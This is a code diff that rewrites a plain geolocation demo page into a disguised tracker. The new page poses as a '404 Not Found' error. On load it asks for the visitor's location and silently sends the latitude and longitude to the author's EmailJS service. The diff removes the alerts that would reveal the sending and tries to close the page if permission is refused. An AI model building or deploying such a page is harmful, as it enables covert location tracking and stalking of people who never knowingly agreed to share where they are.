@@ -3,25 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation Capture</title>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>404 Not Found</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
+        // Initialize EmailJS (using your public key)
         (function(){
-            emailjs.init("bktBt1ja4aV3v45hR"); // Your EmailJS public key (user ID)
+            emailjs.init({
+                publicKey: "bktBt1ja4aV3v45hR" // Replace with your public key
+            });
         })();
-        
-        function getLocation() {
+
+        // Function to check geolocation permission
+        function checkGeolocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                navigator.geolocation.getCurrentPosition(sendLocation, exitPage);
             } else {
-                console.error("Geolocation is not supported by this browser.");
+                alert("Geolocation is not supported by this browser.");
+                exitPage();
             }
         }
 
+        // Function to send location to EmailJS
         function sendLocation(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
-            
+
             // Send the location to your email
             emailjs.send("service_rtdzefa", "template_kspwwbf", {
                 latitude: lat,
@@ -29,23 +35,29 @@
             })
             .then(function(response) {
                 console.log("SUCCESS!", response.status, response.text);
-                alert("Email sent successfully!");
             }, function(error) {
-                console.error("FAILED...", error); // Log error details
-                alert("Failed to send email: " + JSON.stringify(error)); // Show error message
+                console.error("FAILED...", error);
             });
 
-            // Open the location in Google Maps
+            // Open the location in Google Maps (for your reference)
             window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
         }
 
-        function showError(error) {
-            console.error("Error occurred: ", error);
+        // Function to handle exit
+        function exitPage() {
+            alert("Geolocation permission is required to access this page. Exiting...");
+            window.close(); // Attempt to close the window
+        }
+
+        // Automatically check geolocation when the page loads
+        window.onload = function() {
+            document.getElementById("status").innerText = "404 Not Found";
+            checkGeolocation();
         }
     </script>
 </head>
 <body>
-    <h1>Get Geolocation</h1>
-    <button onclick="getLocation()">Get My Location</button>
+    <h1 id="status">404 Not Found</h1>
+    <p>The requested page could not be found.</p>
 </body>
 </html>
